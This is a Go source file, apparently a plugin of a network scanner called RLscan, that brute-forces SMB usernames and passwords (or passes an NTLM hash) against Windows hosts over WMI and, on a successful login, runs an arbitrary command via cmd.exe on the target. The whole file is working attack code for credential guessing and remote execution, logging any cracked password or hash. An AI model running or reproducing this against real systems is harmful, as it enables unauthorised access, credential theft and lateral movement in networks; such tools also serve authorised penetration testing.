package Plugins

import (
	common2 "RLscan/pkg/common"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

var ClientHost string
var flag bool

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *common2.HostInfo) (tmperr error) {
	if common2.IsBrute {
		return nil
	}
	starttime := time.Now().Unix()
	for _, user := range common2.Userdict["smb"] {
	PASS:
		for _, pass := range common2.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := Wmiexec(info, user, pass, common2.Hash)
			errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", info.Host, 445, user, pass, err)
			errlog = strings.Replace(errlog, "\n", "", -1)
			common2.LogError(errlog)
			if flag == true {
				var result string
				if common2.Domain != "" {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ", info.Host, info.Ports, common2.Domain, user)
				} else {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v ", info.Host, info.Ports, user)
				}
				if common2.Hash != "" {
					result += "hash: " + common2.Hash
				} else {
					result += pass
				}
				common2.LogSuccess(result)
				return err
			} else {
				tmperr = err
				if common2.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(common2.Userdict["smb"])*len(common2.Passwords)) * common2.Timeout) {
					return err
				}
			}
			if len(common2.Hash) == 32 {
				break PASS
			}
		}
	}
	return tmperr
}

func Wmiexec(info *common2.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	wmiexec.Timeout = int(common2.Timeout)
	return WMIExec(target, user, pass, hash, common2.Domain, common2.Command, ClientHost, "", nil)
}

func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}
	execer := wmiexec.NewExecer(cfgIn)
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC Port is 0, cannot connect")
			return
		}

		err = execer.RPCConnect()
		if err != nil {
			return
		}
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
